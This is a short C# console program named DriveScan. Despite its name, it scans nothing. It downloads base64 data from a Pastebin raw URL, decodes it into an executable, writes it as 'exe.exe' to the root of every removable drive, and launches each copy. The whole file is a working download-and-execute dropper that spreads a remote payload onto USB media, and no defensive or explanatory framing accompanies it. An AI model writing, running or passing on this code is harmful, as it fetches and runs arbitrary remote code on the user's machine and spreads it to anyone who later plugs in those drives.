using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace DriveScan
{
    class Program
    {
        static void Main(string[] args)
        {
            string pastebinUrl = "https://pastebin.com/raw/[PASTEBIN_ID]";
            string base64Code;
            using (WebClient client = new WebClient())
            {
                base64Code = client.DownloadString(pastebinUrl);
            }

            byte[] fileBytes = Convert.FromBase64String(base64Code);
            DriveInfo[] drives = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Removable).ToArray();
            if (drives.Length == 0)
            {
                Console.WriteLine("No removable drives found.");
                return;
            }

            foreach (DriveInfo drive in drives)
            {
                try
                {
                    string targetPath = Path.Combine(drive.RootDirectory.FullName, "exe.exe");
                    File.WriteAllBytes(targetPath, fileBytes);
                    Console.WriteLine($"File transferred to {targetPath}");
                    Process.Start(targetPath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error transferring file to {drive.RootDirectory.FullName}: {ex.Message}");
                }
            }
        }
    }
}
